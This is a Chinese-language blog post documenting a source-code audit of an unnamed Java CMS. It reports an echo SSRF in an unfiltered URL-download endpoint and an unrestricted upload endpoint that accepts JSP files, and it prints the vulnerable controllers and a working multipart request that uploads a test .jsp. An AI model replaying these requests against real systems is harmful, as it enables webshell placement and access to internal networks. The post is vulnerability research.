#  某系统回显SSRF+文件上传0Day审计过程   
原创 Ting丶  Ting的安全笔记   2024-08-06 20:11  
  
#上班摸鱼的时间，打开朋友发的源码审了审，准备储备点C*VD，为后面............（彩蛋：加V：f18089848863进群）  
# 回显SSRF  
  
其实一开始是想审一下任意文件下载的，所以全局搜索了一下download 函数 如图  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Prn4EOgO7vdnibnC7YIATDtypA1pyzDIhj4qPicRnxjfEdRlzRpvyWgAlw2hSL1Esdg3cHkq1hNDtEkiaSAwKoHMQ/640?wx_fmt=png&from=appmsg "")  
  
然后看到这里有一个远程下载函数downloadFromUrl  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Prn4EOgO7vdnibnC7YIATDtypA1pyzDIhNy5mEgrQEia9snbodYD0vQzgwDe3NibvftSBicKv1mZUHqejR6Znjdwng/640?wx_fmt=png&from=appmsg "")  
  
其中调用了InputStream ins = HttpEngine.downloadFromUrl(url);跟进HttpEngine看看![](https://mmbiz.qpic.cn/mmbiz_png/Prn4EOgO7vdnibnC7YIATDtypA1pyzDIhkJlwtylF0rBdVvQmJzv5LcFqCyuIaKl4TiaBbqVYibbJHicrhIWX2mt5w/640?wx_fmt=png&from=appmsg "")  
  
  
看来是没有任何过滤的 接下来看看哪个位置有用到CMSTools的downloadFromUrl方法  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Prn4EOgO7vdnibnC7YIATDtypA1pyzDIhykJrT0x01XFxdSicgtgUls8zn06iaJ4612GSibPzme8AcIqLexn5uYQGw/640?wx_fmt=png&from=appmsg "")  
  
发现在一个控制器下直接使用了CMSTools的downloadFromUrl方法  class对应代码如下  
```
    @RequestMapping({"*****DownloadFile"})
    public void actionDownloadFile(HttpServletRequest request, HttpServletResponse response) {
        String url = request.getParameter("url");
        String name = request.getParameter("name");
        String length = request.getParameter("length");
        CMSTools.downloadFromUrl(url, name, length, request, response);
    }
```  
  
构造数据包如图  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Prn4EOgO7vdnibnC7YIATDtypA1pyzDIhpdQhd8wzKlNg2aHrGeg0W3UbHZzhiaiaKqaCfBicFO718qZlQgtREicZCg/640?wx_fmt=png&from=appmsg "")  
  
发现并没有读取到passwd（已确定是linux） 回到代码  
```
URL url = new URL(remotePath);
HttpURLConnection conn = (HttpURLConnection)url.openConnection();
```  
  
发现这段代码使用了类型强转，转为了HttpURLConnection，也就是说本身url可以使用http、file等协议的，现在只能使用http协议了，不过也是可以SSRF访问内网资源了  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Prn4EOgO7vdnibnC7YIATDtypA1pyzDIhFGOMIxVs5KLuI66Z28eQic97Fj2zDOIte9wFWDKP2Yt2yKFXNZTpNtA/640?wx_fmt=png&from=appmsg "")  
  
DNSlog![](https://mmbiz.qpic.cn/mmbiz_png/Prn4EOgO7vdnibnC7YIATDtypA1pyzDIhLNGwpsqsIiaWpo2JB0CNfZcf877u70jWln7nztxRRQYGsLGuF0DP0xw/640?wx_fmt=png&from=appmsg "")  
![](https://mmbiz.qpic.cn/mmbiz_png/Prn4EOgO7vdnibnC7YIATDtypA1pyzDIhDt8uSOCb05ficRZ9o9JE6OBmjRYaNgic1FKGqLcWdnibtib5fQWPT1wFww/640?wx_fmt=png&from=appmsg "")  
  
# 文件上传  
  
过程很简单就不多赘述了  
  
查看controller层，发现存在文件上传接口，源码如下  
```
    @RequestMapping({"upload********"})
    public void uploadFileApp(@RequestParam CommonsMultipartFile file, HttpServletRequest request, HttpServletResponse response) {
        File parent = new File("********");
        if (!parent.exists()) {
            parent.mkdirs();
        }

        String name = file.getOriginalFilename();
        String alias = UUID.randomUUID().toString();
        if (name.indexOf(".") > -1) {
            alias = alias + name.substring(name.lastIndexOf("."), name.length());
        }

        File f = new File("********" + alias);

        try {
            FileUtils.copyInputStreamToFile(file.getInputStream(), f);
        } catch (Exception var9) {
            var9.printStackTrace();
        }

        JSONObject jo = new JSONObject();
        jo.put("name", alias);
        jo.put("url", "/file/upload/" + alias);
        CMSTools.writeToResponse(response, jo.toString());
    }
```  
  
上级@RequestMapping({"/app"})，因此文件上传接口是/app/upload********  
```
POST /app/upload******** HTTP/1.1
Host: 
Content-Length: 250
Sec-Ch-Ua: "Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"
Accept: */*
Sec-Ch-Ua-Platform: "Windows"
X-Requested-With: XMLHttpRequest
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryGEz9PaQkLuhnjlP4
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Priority: u=1, i
Connection: keep-alive

------WebKitFormBoundaryGEz9PaQkLuhnjlP4
Content-Disposition: form-data; name="file"; filename="706ccd1d8484f7117913545b03eb1dc.jsp"
Content-Type: image/jpeg

<%
out.println("Hello World");
%>
------WebKitFormBoundaryGEz9PaQkLuhnjlP4--




```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Prn4EOgO7vdnibnC7YIATDtypA1pyzDIhLMX2d2siaQ1bnzIkzt4IXrRn1uvIh0RHpIN2h7IIUve48qx9A7McdOg/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Prn4EOgO7vdnibnC7YIATDtypA1pyzDIhHe3IgXhfpdXBgGqt5lSC3M9fvzVD20enJYEcTSVt6AQHtI4ribibbwdA/640?wx_fmt=png&from=appmsg "")  
  
  
